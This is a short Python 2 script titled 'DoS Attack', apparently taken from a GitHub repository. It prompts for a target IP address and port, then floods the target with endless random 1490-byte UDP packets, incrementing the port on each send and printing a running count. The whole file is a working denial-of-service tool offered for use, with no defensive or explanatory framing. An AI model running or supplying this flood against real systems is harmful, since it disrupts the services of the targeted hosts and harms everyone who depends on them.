import sys
import os
import time
import socket
import random
# Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Initialize socket

os.system("clear")
os.system("figlet DoS Attack")
print
print "Original Author   : HA-MRX @ https://github.com/Ha3MrX"
print "Remaker           : Fimall @ https://github.com/ItsFimall"
print "Repo              : https://github.com/ItsFimall/DoS-Attack"
print
# Authors' info's display

ip = raw_input("IP     : ")
port = input("Port   : ")

if port < 1 or port > 65535:
     print "Port range error"
     exit()

sent = 0
# User input DoS Target

os.system("clear")

# os.system("figlet Attack Starting")
# print "[                    ] 0% "
# time.sleep(5)
# print "[=====               ] 25%"
# time.sleep(5)
# print "[==========          ] 50%"
# time.sleep(5)
# print "[===============     ] 75%"
# time.sleep(5)
# print "[====================] 100%"
# time.sleep(3)

while True:
     bytes = random._urandom(1490) # Randomized Bytes
     
     _socket.sendto(bytes, (ip,port)) # Socket send packets
     
     sent = sent + 1
     port = port + 1
     
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)

